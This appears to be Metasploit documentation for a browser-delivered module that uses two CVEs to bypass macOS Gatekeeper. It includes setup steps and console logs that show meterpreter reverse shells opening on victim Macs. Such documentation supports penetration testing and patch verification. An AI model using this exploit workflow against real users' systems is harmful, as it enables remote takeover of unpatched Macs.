## Vulnerable Application

This module exploits two CVEs that bypass Gatekeeper.

For CVE-2021-30657 this module serves an OSX app (as a zip) that contains
no Info.plist, which bypasses gatekeeper in macOS < 11.3.

If the user visits the site on Safari, the zip file is automatically extracted,
and clicking on the downloaded file will automatically launch the payload.
If the user visits the site in another browser, the user must click once to unzip
the app, and click again in order to execute the payload.

For CVE-2022-22616, this module serves a gzip-compressed zip file with its file header pointing
to the `Contents` directory which contains an OSX app. If the user downloads the file via Safari,
Safari will automatically decompress the file, removing its `com.apple.quarantine` attribute.
Because of this, the file will not require quarantining, bypassing Gatekeeper on
MacOS versions below 12.3.

## Verification Steps

1. Start `msfconsole`
2. `use exploit/osx/browser/osx_gatekeeper_bypass`
3. `set CVE <cve_num>`
4. `set LHOST <tab>`
5. `set SRVHOST <tab>`
6. `exploit`
7. Visit the URL on a vulnerable version of macOS

## Options

### APP_NAME

Name of the app to be served.

### CVE

The vulnerability to use in the exploit. The default value is the most recent cve (CVE-2022-22616).

## Scenarios

### macOS Catalina 10.15.6

```
msf6 > use exploit/osx/browser/osx_gatekeeper_bypass
[*] No payload configured, defaulting to osx/x64/meterpreter/reverse_tcp
msf6 exploit(osx/browser/osx_gatekeeper_bypass) > set srvhost 192.168.37.1
srvhost => 192.168.37.1
msf6 exploit(osx/browser/osx_gatekeeper_bypass) > set lhost 192.168.37.1
lhost => 192.168.37.1
msf6 exploit(osx/browser/osx_gatekeeper_bypass) > options

Module options (exploit/osx/browser/osx_gatekeeper_bypass):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   APP_NAME  app              no        The application name (Default: app)
   SRVHOST   192.168.37.1     yes       The local host or network interface to listen on. This must be an a
                                        ddress on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)


Payload options (osx/x64/meterpreter/reverse_tcp):

   Name                   Current Setting  Required  Description
   ----                   ---------------  --------  -----------
   LHOST                  192.168.37.1     yes       The listen address (an interface may be specified)
   LPORT                  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   macOS x64 (Native Payload)


msf6 exploit(osx/browser/osx_gatekeeper_bypass) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.37.1:4444
msf6 exploit(osx/browser/osx_gatekeeper_bypass) > [*] Using URL: http://192.168.37.1:8080/q670M8fEMu
[*] Server started.
[*] 192.168.37.132   osx_gatekeeper_bypass - Request /q670M8fEMu from Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
[+] 192.168.37.132   osx_gatekeeper_bypass - macOS version 10.15.6 is vulnerable
[*] Transmitting first stager...(210 bytes)
[*] Transmitting second stager...(8192 bytes)
[*] Sending stage (810096 bytes) to 192.168.37.132
[*] Meterpreter session 1 opened (192.168.37.1:4444 -> 192.168.37.132:49380) at 2021-04-29 15:21:38 -0500

msf6 exploit(osx/browser/osx_gatekeeper_bypass) > sessions

Active sessions
===============

  Id  Name  Type                 Information                           Connection
  --  ----  ----                 -----------                           ----------
  1         meterpreter x64/osx  space @ spaces-Mac.local (uid=501, g  192.168.37.1:4444 -> 192.168.37.132:
                                 id=20, euid=501, egid=20) @ spaces-M  49380 (192.168.37.132)
                                 ac.local

msf6 exploit(osx/browser/osx_gatekeeper_bypass) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: space @ spaces-Mac.local (uid=501, gid=20, euid=501, egid=20)
meterpreter > sysinfo
Computer     : spaces-Mac.local
OS           : macOS Catalina (macOS 10.15.6)
Architecture : x86
BuildTuple   : x86_64-apple-darwin
Meterpreter  : x64/osx
```

### macOS Big Sur 11.5.2

```
msf6 > use exploit/osx/browser/osx_gatekeeper_bypass
[*] No payload configured, defaulting to osx/x64/meterpreter/reverse_tcp
msf6 exploit(osx/browser/osx_gatekeeper_bypass) > set lhost 192.168.140.1
lhost => 192.168.140.1
msf6 exploit(osx/browser/osx_gatekeeper_bypass) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.140.1:4444
msf6 exploit(osx/browser/osx_gatekeeper_bypass) > [*] Using URL: http://192.168.140.1:8080/pUyNR5yWEqCu
[*] Server started.
msf6 exploit(osx/browser/osx_gatekeeper_bypass) >
[*] 192.168.140.137  osx_gatekeeper_bypass - Request /pUyNR5yWEqCu from Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
[+] 192.168.140.137  osx_gatekeeper_bypass - Safari version 14.1.2 is vulnerable
[*] Transmitting first stager...(210 bytes)
[*] Transmitting second stager...(8192 bytes)
[*] Sending stage (810576 bytes) to 192.168.140.137
[*] Meterpreter session 2 opened (192.168.140.1:4444 -> 192.168.140.137:49355 ) at 2022-04-05 10:10:01 -0500

msf6 exploit(osx/browser/osx_gatekeeper_bypass) > sessions -i -1
[*] Starting interaction with 2...

meterpreter > getuid
Server username: space
meterpreter > sysinfo
Computer     : spaces-Mac.local
OS           :  (macOS 11.5.2)
Architecture : x64
BuildTuple   : x86_64-apple-darwin
Meterpreter  : x64/osx
meterpreter >
```
